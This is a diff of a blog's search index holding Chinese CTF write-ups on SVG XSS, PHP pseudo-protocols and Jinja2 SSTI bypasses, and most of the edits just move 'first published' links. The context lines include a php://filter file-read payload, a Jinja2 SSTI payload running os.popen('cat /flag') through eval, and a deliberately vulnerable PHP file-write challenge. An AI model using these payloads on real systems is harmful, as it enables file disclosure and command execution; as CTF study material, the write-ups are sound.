class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span> </span><br></pre></td></tr></table></figure>
@@ -4111,6 +3959,7 @@
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>SVG算是一个比较容易让人忽视的点，但是他造成的一些问题却是我们不能够忽视的，在CTF中如果有些题目没有限制SVG这个点的话，我们就可以尝试用他来进行XSS或者XXE，然后在查阅资料的过程，发现在国外有人总结了SVG的攻击XSS的一些payload以及防御的方案，具体可以参考：</p>
 <p><a href="https://svg.digi.ninja/">https://svg.digi.ninja/</a></p>
 <p><a href="https://github.com/digininja/svg_xss">https://github.com/digininja/svg_xss</a></p>
+<p>文章首发合天：<a href="https://mp.weixin.qq.com/s/aVLU4Q7VzmrmrjAYRguLHw">传送门</a></p>
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://yulige.top/?p=665">http://yulige.top/?p=665</a></p>
 <p><a href="https://www.rootnetsec.com/bsidessf-svgmagick/">https://www.rootnetsec.com/bsidessf-svgmagick/</a></p>
 <p><a href="https://www.freebuf.com/vuls/207639.html">https://www.freebuf.com/vuls/207639.html</a></p>
@@ -4122,7 +3971,7 @@
   <entry>
     <title>第三届海啸杯</title>
     <url>/2020/11/19/%E6%B5%B7%E5%95%B8%E6%9D%AF/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记一次校内的比赛<a id="more"></a></p>
+    <content><![CDATA[<p>记一次广航校内的比赛，本次作为出题人，虽然只出了一道题<a id="more"></a></p>
 <h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="表白"><a href="#表白" class="headerlink" title="表白"></a>表白</h3><p>PNG高度隐藏</p>
 <p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119115739801.png" alt="image-20201119115739801"></p>
 <h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h3><p>基于 LSB 原理图片隐写</p>
@@ -4275,10 +4124,9 @@
       </categories>
   </entry>
   <entry>
-    <title>【转载】记一次某众测的考核</title>
+    <title>记一次某众测的考核</title>
     <url>/2020/11/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9F%90%E4%BC%97%E6%B5%8B%E7%9A%84%E8%80%83%E6%A0%B8/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>文章首发合天：<a href="https://mp.weixin.qq.com/s/Gw8d18DkRHtCF1Co_tnzWg">传送门</a><a id="more"></a></p>
-<p>最近没什么事，于是报名了某众测，填了资料主办方给了个靶场要考核，这里记录一下靶场考核中的解题过程，一共十道题目，难度也不算太难，但也有一些题没做出来，最后也是顺利的通过了考核。</p>
+    <content><![CDATA[<p>最近没什么事，于是报名了某众测，填了资料主办方给了个靶场要考核，这里记录一下靶场考核中的解题过程，一共十道题目，难度也不算太难，但也有一些题没做出来，最后也是顺利的通过了考核。<a id="more"></a></p>
 <p><img src="http://yuhaojiang.gitee.io/picture/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9F%90%E4%BC%97%E6%B5%8B%E7%9A%84%E8%80%83%E6%A0%B8/image-20201029125542536.png" alt="image-20201029125542536"></p>
 <h2 id="前戏"><a href="#前戏" class="headerlink" title="前戏"></a>前戏</h2><p>首先考核要答一些选择题和判断题，没什么好说的，主办方要求连了vpn没法上外网，但是都是一些基础的网络安全问题，随便答答就过了，接下来就是靶场的题目了。</p>
 <h2 id="靶场题目"><a href="#靶场题目" class="headerlink" title="靶场题目"></a>靶场题目</h2><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><p>WeSec微信公众号</p>
@@ -4393,6 +4241,7 @@
 
 <p>最后跑出五个账号密码，只有一个能用，md5解密登录拿key。</p>
 <p>sql注入不愧是OWASP TOP 10 之  榜首，10道题目出现了3道，有一说一sqlmap真的是好用。</p>
+<p>文章首发合天：<a href="https://mp.weixin.qq.com/s/Gw8d18DkRHtCF1Co_tnzWg">传送门</a></p>
 ]]></content>
       <categories>
         <category>考核</category>
@@ -4401,7 +4250,7 @@
   <entry>
     <title>xmctf</title>
     <url>/2020/12/17/xmctf/</url>
-    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>一共做了8道题，记录一下解题过程<a id="more"></a></p>
+    <content><![CDATA[<p>星盟战队的考核题，一共做了8道题，记录一下解题过程<a id="more"></a></p>
 <p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201217195705321.png" alt="image-20201216234950487"></p>
 <h3 id="web3-考核"><a href="#web3-考核" class="headerlink" title="web3-考核"></a>web3-考核</h3><p>题目源码为</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$content = @$_GET[<span class="string">&#x27;content&#x27;</span>] ? <span class="string">&quot;---mylocalnote---\n&quot;</span> . $_GET[<span class="string">&#x27;content&#x27;</span>] : <span class="string">&quot;&quot;</span>;</span><br><span class="line">$name = @$_GET[<span class="string">&#x27;name&#x27;</span>] ? $_GET[<span class="string">&#x27;name&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">str_replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $name);</span><br><span class="line">str_replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $name);</span><br><span class="line">file_put_contents(<span class="string">&quot;/tmp/&quot;</span> . $name, $content);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Thank u,<span class="subst">&#123;$_SESSION[&#x27;username&#x27;]&#125;</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br></pre></td></tr></table></figure>
@@ -4509,10 +4358,9 @@
       </categories>
   </entry>
   <entry>
-    <title>【转载】php伪协议在CTF中的应用小结</title>
+    <title>php伪协议在CTF中的应用小结</title>
     <url>/2020/12/22/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8%E5%B0%8F%E7%BB%93/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><a id="more"></a>前言</h2><p>文章首发i春秋：<a href="https://bbs.ichunqiu.com/thread-59593-1-1.html">传送门</a></p>
-<p>php的伪协议在CTF中算是一个比较老的知识点，也有一些新的利用点，在最近的CTF比赛中比如极客大挑战2020，WMCTF2020中的题目也还会出现，于是本篇文章就把CTF中涉及到这个知识点的地方从浅到深做一个复习和总结</p>
+    <content><![CDATA[<p>php的伪协议在CTF中算是一个比较老的知识点，也有一些新的利用点，在最近的CTF比赛中比如极客大挑战2020，WMCTF2020中的题目也还会出现，于是本篇文章就把CTF中涉及到这个知识点的地方从浅到深做一个复习和总结<a id="more"></a></p>
 <blockquote>
 <p>关于php中的伪协议可以参考官方文档：<a href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a></p>
 </blockquote>
@@ -4871,6 +4719,7 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span><br></pre></td></tr></table></figure>
 
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文只是总结了一下之前在打CTF遇到的一些用法，实际上php中伪协议的用法肯定不止这些，然后就是本文有写的不对不足的地方请师傅们多多指出</p>
+<p>文章首发i春秋：<a href="https://bbs.ichunqiu.com/thread-59593-1-1.html">传送门</a></p>
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
 <p><a href="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/">https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/</a></p>
 ]]></content>
@@ -4879,12 +4728,9 @@
       </categories>
   </entry>
   <entry>
-    <title>【转载】细说Jinja2之SSTI&amp;bypass</title>
+    <title>细说Jinja2之SSTI&amp;bypass</title>
     <url>/2020/12/18/%E7%BB%86%E8%AF%B4Jinja2%E4%B9%8BSSTI&amp;bypass/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>文章首发合天：<a href="https://mp.weixin.qq.com/s/_6ObDR5YKpLFoQXTYXE_pQ">传送门</a></p>
-<p>SSTI（Server-Side Template Injection）服务端模板注入在CTF中并不是一个新颖的考点了，之前略微学习过，但是最近的大小比赛比如说安洵杯，祥云杯，太湖杯，南邮CTF，上海大学生安全竞赛等等比赛都频频出现，而且赛后看到师傅们各种眼花缭乱的payload，无法知晓其中的原理，促使我写了这篇文章来总结各种bypass SSTI的方法。</p>
+    <content><![CDATA[<p>SSTI（Server-Side Template Injection）服务端模板注入在CTF中并不是一个新颖的考点了，之前略微学习过，但是最近的大小比赛比如说安洵杯，祥云杯，太湖杯，南邮CTF，上海大学生安全竞赛等等比赛都频频出现，而且赛后看到师傅们各种眼花缭乱的payload，无法知晓其中的原理，促使我写了这篇文章来总结各种bypass SSTI的方法。<a id="more"></a></p>
 <h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>本篇文章从Flask的模板引擎Jinja2入手，CTF中大多数也都是使用这种模板引擎</p>
 <h3 id="模板的基本语法"><a href="#模板的基本语法" class="headerlink" title="模板的基本语法"></a>模板的基本语法</h3><p>官方文档对于模板的语法介绍如下</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% ... %&#125; for Statements</span><br><span class="line"></span><br><span class="line">&#123;&#123; ... &#125;&#125; for Expressions to print to the template output</span><br><span class="line"></span><br><span class="line">&#123;# ... #&#125; for Comments not included in the template output</span><br><span class="line"></span><br><span class="line">#  ... ## for Line Statements</span><br></pre></td></tr></table></figure>
@@ -5358,6 +5204,7 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">｛｛url_for.__globals__［＇__builtins__＇］［＇eval＇］（＇__import__（＂os＂）.popen（＂cat &#x2F;flag＂）.read（）＇）｝｝ </span><br></pre></td></tr></table></figure>
 
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>因为水平和文章篇幅有限，可能还有一些bypass方法没有提到，还有就是CTF中也不只考Jinja2这种模板，还有另外的Twig模板，smart等模板，这些就等以后有必要再更吧，最后就是有不足之处请各位师傅指出</p>
+<p>文章首发合天：<a href="https://mp.weixin.qq.com/s/_6ObDR5YKpLFoQXTYXE_pQ">传送门</a></p>
 <h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><p><a href="https://p0sec.net/index.php/archives/120/">https://p0sec.net/index.php/archives/120/</a></p>
 <p><a href="https://www.jianshu.com/p/a736e39c3510">https://www.jianshu.com/p/a736e39c3510</a></p>
 <p><a href="https://www.redmango.top/article/43">https://www.redmango.top/article/43</a></p>
